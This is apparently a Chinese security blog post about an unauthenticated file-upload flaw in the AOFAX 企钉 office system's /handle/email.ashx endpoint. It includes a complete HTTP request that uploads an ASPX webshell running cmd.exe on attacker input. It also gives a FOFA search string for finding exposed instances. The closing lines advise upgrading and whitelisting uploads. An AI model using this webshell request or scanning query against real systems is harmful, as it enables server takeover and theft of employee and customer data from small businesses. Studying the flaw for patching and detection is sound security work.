#  认证为空的致命接口 AOFAX企钉前台上传漏洞  
原创 lin
                    lin  船山信安   2026-06-30 04:17  
  
NCC-2026-03565，这个漏洞的来源是金恒科技（深圳）旗下的AOFAX企钉。是一个涉及到前台文件上传的，不需要认证，也不需要账号，任何人从公网发一个请求进去，就能在服务器上留一个自己的文件。  
  
这套系统本名叫傲发办公通信专家，深圳市傲发科技有限公司的产品，定位是给中小企业做一站式融合通信。协同办公、客户管理、内部通信打包进来，卖点正是"低成本、高效率"。实际上，把这么多功能捆在一起部署的系统，往往意味着攻击面比普通产品宽得多，而一旦出问题，横向移动的空间也大得多。  
  
漏洞出  
在 /handle/email.ashx  
 这个  
接口上。这是系统用来处理邮件附件相关操作的Handler，本不该对外敞开，更不该不验证调用方是谁。根据cn-sec https://cn-sec.com/archives/4129962.html披露的技术细节，接口对上传文件的类型和内容没有任何有效约束，攻击者可以把一个.aspx的Webshell直接怼进去，服务器接收，IIS解析，shell就跑起来了。  
  
同产品线的公开POC格式（来源：https://github.com/SourByte05/Vulnerability-Wiki-PoC），可以看到AOFAX的handle接口族请求结构极为简单，连身份验证字段都没有设计进去。基于已公开信息，针对email.ashx的上传请求大致如下：  
```
POST /handle/email.ashx HTTP/1.1Host: target.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW------WebKitFormBoundary7MA4YWxkTrZu0gWContent-Disposition: form-data; name="file"; filename="shell.aspx"Content-Type: application/octet-stream<%@ Page Language="C#" %><% Response.Write(System.Diagnostics.Process.Start("cmd.exe",Request["c"])); %>------WebKitFormBoundary7MA4YWxkTrZu0gW--
```  
  
打靶的方式很简单，  
用FOFA搜 body="getincommingcall"  
 就能把暴  
露在公网的AOFAX实例筛出来。这批资产里头，多数是中小企业，没有专职安全运维，系统装完就放在那里，连个防火墙规则都懒得收紧。  
  
说起来，这类OA系统的文件上传洞已经不是第一次出现了，ddpoc平台https://www.ddpoc.com/DVB-2025-9213.html给这个系列漏洞标注了高危级别，并且明确写着"未经授权的攻击者可通过该漏洞获取服务器控制权限"。控制权限这几个字，意味着什么，渗透过OA的人都清楚，不只是一台服务器，里面的员工通讯记录、客户数据、内部文件全部都在里面。  
  
官方已发布修复版本，建议立即升级至 http://www.aofax11.com/ 最新版本，并对上传接口做白名单过滤，限制非授权来源访问。  
  
  
